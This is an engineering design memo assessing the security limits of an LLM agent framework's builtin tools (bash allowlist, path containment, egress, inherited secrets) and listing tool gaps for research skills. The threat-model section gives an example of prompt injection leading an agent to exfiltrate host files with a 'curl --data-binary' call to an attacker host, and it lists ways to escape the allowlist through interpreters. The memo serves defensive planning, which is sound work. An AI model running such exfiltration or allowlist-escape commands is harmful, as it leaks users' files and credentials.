# Builtin Tools — Security and Research Coverage Memo

Last updated: 2026-05-19.
Status: Assessment only. No implementation is committed by this document.
Related: `docs/builtin-tools-restructure-plan.md`,
`docs/deferred-refactor-tracker-memo.md` § "PR C - Builtin Tools
Restructure".

This memo records, as of the PR C-6 closeout, two things that fell out
of scope of the restructure but matter before Dango formally adopts
research-class or autonomous-experiment skills:

1. The realistic security envelope of the current builtin tool set.
2. The coverage gap between today's tools and the workflows a research
   or autonomous-experiment skill typically needs.

It is written so a future PR proposing research-skill support can pick
it up without rereading this conversation. Nothing here proposes new
tools to ship today; each candidate is a hook for a separately scoped
PR.

## 1. Inventory snapshot

Default (always on): `bash`, `read_file`, `write_file`, `edit_file`,
`delete_file`, `move_file`, `grep`, `pipeline_search_replace`,
`file_excerpt`.

Opt-in via `BuiltinExtras`: `list_dir`, `pwd`.

Bash allowlist (`internal/llm/internal/builtin/allowlist.go`,
`defaultAllowlist`) covers ~70 binaries spanning read-only text tools,
archive tools, language toolchains, package managers, and the two
network fetchers `curl` and `wget`. Destructive tools (`rm`, `mv`,
`dd`, `sudo`) are intentionally absent; filesystem mutation is funnelled
through the Go tools.

## 2. Security envelope

### 2.1 What is actually enforced

- **Path containment for Go tools.** Every Go-implemented tool routes
  paths through `workspace.ResolvePath`, which rejects paths outside the
  temp playground, the skill source root, and any user-added accessible
  directory. Symlink escapes through existing prefixes are rejected by
  `resolvePathExistingPrefix`.
- **Bash redirection containment.** `checkRedirections` (PR C-1)
  statically rejects dynamic redirect targets and absolute targets
  outside the workspace. Heredocs and here-strings are accepted because
  they do not touch host paths.
- **Bash allowlist on simple-command heads.** `checkAllowlist` walks the
  parsed AST and rejects unknown command heads, including inside
  pipelines, subshells, and command substitutions.
- **Output and runtime bounds.** Bash output is capped at 16 KiB by
  default; `output_file` redirects large output into a workspace-bounded
  file. Default timeout is 60 s; `long_running: true` defers to parent
  context cancellation.

### 2.2 What is not enforced (known and accepted today)

- **Argument-level write targets.** `tee /etc/foo`, `cp src /etc/foo`,
  `dd of=/etc/foo`, `python -c "open('/etc/foo','w')..."`, and similar
  are not inspected. Bash and `system_instructions.md` already document
  this. Skills that need workspace containment must route writes through
  redirections or the Go file tools.
- **Allowlist is per-process-head, not per-effective-action.** Allowed
  Turing-complete heads (`python3`, `node`, `bash -c "..."`, `sh -c`,
  `make`, `xargs <cmd>`, `find ... -exec ...`, `awk 'BEGIN{system(...)}'`)
  can execute arbitrary code that the allowlist never inspects. The
  allowlist is a forcing function for tool selection, not a sandbox.
- **Network egress is unrestricted.** `curl` and `wget` are in the
  default allowlist with no URL allowlist or rate limit. Package
  managers (`pip`, `npm`, `pnpm`, `cargo`, `uv`, `conda`, `pixi`, …)
  pull and execute arbitrary code from package indexes on install.
- **Process environment is inherited.** Bash inherits the parent
  process's full environment, so any secrets exported to the host shell
  (API keys, SSH agent sockets, cloud credentials) are visible to the
  model. There is no env filtering or per-skill secret broker.
- **No resource caps beyond timeout.** No CPU, memory, file-descriptor,
  process-count, or disk-quota limits. Long-running bash defers to the
  parent context only.
- **No audit log dedicated to tool calls.** The stream-event log
  captures `llm.tool_call.started`, which is enough for trace analysis
  (see PR C-3), but it is not designed as a security audit trail.

### 2.3 Threat-model implications

The current envelope is appropriate for **trusted local developer use**:
a human is running the example, the workspace is disposable, and
network egress / package install is desirable. It is **not** appropriate
for:

- Untrusted task input where prompt injection could cause the model to
  exfiltrate host files via `curl --data-binary @/path http://attacker`.
- Multi-tenant or shared-host execution.
- Autonomous experiment loops that may run unattended for hours and
  accumulate state, install dependencies, and contact external services
  without human review of each step.

Mitigations to consider before that adoption (each its own PR):

- An optional egress allowlist on `curl`/`wget` (and the equivalent
  hooks in pip/npm/cargo wrappers).
- A `WithBashEnv(...)` filter that scrubs the inherited environment by
  default and lets skills opt into specific keys.
- Argument-level write-target inspection for the small set of allowed
  commands that take a write path (`tee`, `cp`, `dd`, redirected
  `awk`/`sed`).
- A "no network" config preset that drops `curl`/`wget` and package
  installers from the allowlist when the skill does not need them.
- Resource caps (RLIMIT_AS, RLIMIT_CPU, RLIMIT_NOFILE) on the bash
  child process.

## 3. Coverage gap for research / autonomous experiment skills

The PR C restructure tuned the default set for general code-and-data
work. Research and autonomous-experiment workflows pull in several
verticals that the current set covers only through ad-hoc bash. The
gaps below are grouped by workflow stage; each one is a candidate, not a
commitment.

### 3.1 Source discovery and literature

- **Web search.** No structured `web_search` tool. Skills that need to
  locate papers, datasets, or documentation can only `curl` known URLs.
  A `web_search` tool that returns ranked titles + snippets + URLs would
  remove a Turing-complete escape (`python3 -c "...requests..."`) from
  the hot path.
- **Authoritative paper fetch.** `arxiv_fetch` /
  `semantic_scholar_fetch` style wrappers that return metadata + PDF
  path inside the workspace. Currently done via bash + `curl` + manual
  HTML scraping.
- **HTML / PDF extraction.** `pdf_extract_text`, `pdf_extract_tables`,
  `html_to_markdown`. Done today via `python3 + pdfminer/pymupdf`, which
  forces every research skill to redeclare an extraction script.
- **Citation handling.** `citation_format` (BibTeX/CSL-JSON in, formatted
  string out). Low priority; mention only because every literature task
  re-implements it.

### 3.2 Dataset and environment management

- **Dataset fetch with caching.** `dataset_fetch` (URL or
  Kaggle/HuggingFace dataset id, returns path inside workspace, caches
  across runs in a user-added accessible dir). Replaces ad-hoc
  `curl | tar -xz` chains.
- **Tabular preview / schema sniff.** `table_preview` (CSV/Parquet/JSON
  Lines path → first N rows + inferred schema + null counts). Today
  this is bash + `python3 -c "import pandas..."` boilerplate that costs
  tokens on every research turn.
- **Notebook execution.** `notebook_run` (path + parameters →
  executed-notebook artifact path). `jupyter` is on the allowlist but
  the model has to remember the `nbconvert --execute` incantation each
  time.

### 3.3 Experiment lifecycle

- **Experiment logger.** `experiment_log` (write a structured row
  describing run config, metrics, artifact paths). Right now the
  pattern is hand-rolled JSONL files in `memo/` per skill.
- **Background job control.** Bash supports `long_running: true` but
  there is no listing/killing of running jobs and `kill`, `ps`,
  `pgrep`, `pkill`, `nohup`, `timeout` are not on the allowlist. For
  autonomous experiments that fork training jobs and need to abort on
  early-stopping signals, this is the biggest concrete gap.
- **Resource probe.** `system_probe` (available CPU, RAM, GPU
  visibility). Today via `nvidia-smi`/`free -h` which are not on the
  allowlist either. Useful for deciding batch sizes before launching a
  training run.
- **Cluster submission.** `slurm_submit` / `slurm_status`,
  `ssh_run`. Out of scope for the first research-skill PR but should
  be noted: today bash cannot reach `sbatch`/`squeue`/`ssh` because
  none are on the allowlist.

### 3.4 Version control and history

- **Git.** Not on the default allowlist. Research skills that ingest
  existing repos (read commit history, diff between revisions, blame a
  line) currently cannot. Adding `git` to the allowlist is the simplest
  patch; a `git_log` / `git_diff` wrapper is the token-frugal version
  if traces justify it under the PR C-3 rule.

### 3.5 Structured artifact handling

- **Artifact catalog.** A first-class read of the per-task
  `downstream/artifacts/` directory + the handoff front-matter
  `artifacts:` list, returning a typed summary instead of forcing the
  model to re-grep handoff YAML.
- **JSON/YAML schema preview.** `jq` and `yq` are on the allowlist, so
  this is reachable, but a `structured_preview` wrapper that returns
  top-level keys plus value-type counts is cheaper for autonomous
  loops than a fresh `jq` invocation each turn.

## 4. Suggested sequencing

If a future PR proposes adding any of these, the following order keeps
risk bounded:

1. **Allowlist additions and config knobs** before new tools. Adding
   `git`, `kill`, `ps`, `timeout`, `nohup` to the default (or to an
   opt-in `BuiltinExtras`-style list) is a small, reversible change.
2. **Egress controls** (`WithBashURLAllowlist(...)`,
   `WithBashEnv(...)`) before any autonomous-experiment skill is
   wired up. These should land independently of the tool-coverage work
   so the security envelope is in place when the new skills arrive.
3. **High-leverage research wrappers** (`web_search`, `pdf_extract`,
   `table_preview`, `notebook_run`) ordered by trace evidence per the
   PR C-3 methodology, with one wrapper per PR.
4. **Experiment-lifecycle tools** (`experiment_log`, background-job
   control) last, since they assume the security envelope above and
   the data-handling wrappers under it.

## 5. Out of scope of this memo

- No new tool is being added by PR C-6 or by this memo.
- No allowlist change is being made; the listed candidates are pointers,
  not decisions.
- No commitment to a specific research-skill design. That belongs in a
  separate planning doc when the first research skill is scoped.
